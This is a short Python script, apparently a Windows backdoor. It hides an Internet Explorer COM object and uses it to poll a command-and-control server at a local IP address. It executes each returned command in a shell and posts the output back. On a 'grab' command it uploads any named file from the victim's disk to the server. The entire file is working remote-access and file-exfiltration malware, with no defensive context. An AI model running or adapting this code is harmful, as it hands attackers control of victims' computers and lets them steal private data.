#  grab with intarnet explorer reverse http
import os
import requests
from win32com.client import Dispatch
from time import sleep
import subprocess

ie = Dispatch("InternetExplorer.Application")
ie.Visible = 0

dURL = "http://192.168.1.23:8085"
Flags = 0
TargetFrame = 0

while True:
    ie.Navigate("http://192.168.1.23:8085")
    while ie.ReadyState != 4:
        print(ie.ReadyState)
        sleep(1)

    command = ie.Document.body.innerHTML
    if 'grab' not in command:
        command = command.encode()

        if 'terminate' in command.decode():
            ie.Quit()
            break

        else:
            CMD = subprocess.Popen(command.decode(), shell=True, stdin=subprocess.PIPE, stderr=subprocess.PIPE,
                                   stdout=subprocess.PIPE)
            Data = CMD.stdout.read()
            PostData = memoryview(Data)
            ie.Navigate(dURL, Flags, TargetFrame, PostData)



    elif 'grab' in command:
        grab, path = command.split("*")
        if os.path.exists(path):
            url = "http://192.168.1.23:8085/store"
            files = {'file': open(path, 'rb')}
            r = requests.post(url, files=files)
        else:
            post_response = requests.post(url='http://192.168.1.23:8085',
                                          data='[-] Not able to find the file!'.encode())
    sleep(3)